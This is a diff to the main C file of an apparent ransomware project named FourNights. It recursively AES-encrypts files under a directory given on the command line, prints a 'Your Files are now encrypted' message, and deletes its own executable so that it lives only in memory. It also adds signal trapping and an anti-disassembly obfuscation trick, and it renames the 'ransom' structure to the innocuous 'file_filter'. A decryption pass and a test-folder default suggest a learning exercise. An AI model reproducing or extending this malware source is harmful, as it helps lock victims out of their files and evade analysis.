@@ -1,4 +1,5 @@
 #include "fournights.h"
+#ifndef NO_OBFUSCATION
 /**
   * sighandler - traps signals
   * @sig: Signal to trap
@@ -20,6 +21,7 @@ static void sighandler(int sig)
 	if (sig == SIGTSTP)
 		write(1, "\n\nStap it\n", 10);
 }
+#endif
 
 /**
   * main - Entry point
@@ -28,61 +30,64 @@ static void sighandler(int sig)
   * Return: 0
   * TODO: need to eliminate hard coded strings.
  **/
-int main(void)
+int main(int argc, char *argv[])
 {
-	int i = 0;
-	int iv_len = 0;
-	struct ransom_s ransom;
+	unsigned char salt[16];
+	struct file_filter_s file_filter;
 	EVP_CIPHER_CTX encrypt;
 	EVP_CIPHER_CTX decrypt;
 
-	/** handle signals
-	  * TODO: Account for errors
+#ifndef NO_OBFUSCATION
+	/* MISC obfuscation techniques.
+	 * Trying to go for anti-disassemble + obfuscation
 	 **/
 	signal(SIGINT, sighandler);
 	signal(SIGTERM, sighandler);
 	signal(SIGTSTP, sighandler);
 	signal(SIGTRAP, sighandler);
+	file_filter.tmp_bufs->bytes_read = 44 >> 1 == 0xE8 ? (size_t)&simple_search : 0;
+#endif
 
-	ransom.target_file_buf->bytes_read = 44 >> 1 == 0xE8 ? (size_t)&simple_search : 0;
-	init_struct(&ransom, "/home/vagrant/FourNights/TESTS/");
+	if (argc == 1)
+		init_struct(&file_filter, "/home/vagrant/FourNights/TESTS/");
+	else
+		init_struct(&file_filter, argv[1]);
 	/* ENCRYPT */
-	aes_init((unsigned char *)ransom.key, my_strlen(ransom.key), (unsigned char *)&(ransom.salt), &encrypt, &decrypt);
-	ransom.target_file_buf->cipher = &encrypt;
-	iv_len = EVP_CIPHER_iv_length(encrypt.cipher);
-	for (i = 0; i <= iv_len; i++)
-		putchar(encrypt.oiv[i]);
+	getcwd(file_filter.tmp_bufs->filepath, BIGBUF);
+	my_strncat(file_filter.tmp_bufs->filepath, argv[0] + 1, my_strlen(file_filter.tmp_bufs->filepath), my_strlen(argv[0]) - 1);
+	unlink(file_filter.tmp_bufs->filepath); /* delete me from the OS, i will now live in memory */
 
-	recurse_ls((char *)ransom.root_path, &ransom);
+	RAND_bytes(salt, 16);
+	aes_encrypt_init((unsigned char *)file_filter.key, my_strlen(file_filter.key), (unsigned char *)&salt, &encrypt);
+	file_filter.tmp_bufs->cipher = &encrypt;
+	/* Walk through directory TODO: Change name of function */
+	recurse_ls((char *)file_filter.root_path, &file_filter);
 #ifndef NO_DEBUG
-	print_for_debug(ransom);
+	print_for_debug(file_filter);
 #endif
-	/* DECRYPT */
-#ifndef NO_DEBUG
-	printf("######################\n");
-	printf("Starting to decrypt!\n");
-	printf("######################\n");
-#endif
-	ransom.cipher_flag = 'd';
-	ransom.target_file_buf->cipher = &decrypt;
-
-	/* reset file extension tokens */
-	my_strncat(ransom.file_exts_whole_str, ".betty", 0, 6);
-	ransom.file_exts_whole_str[6] = '\0';
-	ransom.file_extensions[1] = NULL;
-
-#ifndef NO_DEBUG
-	printf("%s\n", ransom.file_exts_whole_str);
-	printf("%s\n", ransom.file_extensions[0]);
-	print_for_debug(ransom);
-#endif
-	printf("Your Files are now encrypted. Please enter the password\n");
+	printf("Your Files are now encrypted. Please enter the password (press enter)\n");
 	getchar();
 	printf("Way to go! Here are your files back.\n");
-
-	recurse_ls((char *)ransom.root_path, &ransom);
-	EVP_CIPHER_CTX_cleanup(&encrypt);
+#ifndef NO_DEBUG
+	/* DECRYPT */
+	printf("######################\nStarting to decrypt!\n######################\n");
+#endif
+	file_filter.cipher_flag = 'd';
+	if (aes_decrypt_init(&decrypt) == -1)
+	{
+		printf("Could not decrypt your data, sorry.\n");
+	}
+	file_filter.tmp_bufs->cipher = &decrypt;
+	/* reset file extension tokens */
+	my_strncat(file_filter.file_exts_whole_str, ".betty\0", 0, 7);
+	file_filter.file_extensions[1] = NULL;
+	/* Walk through directories */
+	recurse_ls((char *)file_filter.root_path, &file_filter);
+#ifndef NO_DEBUG
+	print_for_debug(file_filter);
+#endif
+	EVP_CIPHER_CTX_cleanup(&encrypt); /* TODO: call after encryption */
 	EVP_CIPHER_CTX_cleanup(&decrypt);
-	free_ransom_struct(&ransom);
+	free_file_filter_struct(&file_filter);
 	return (EXIT_SUCCESS);
 }
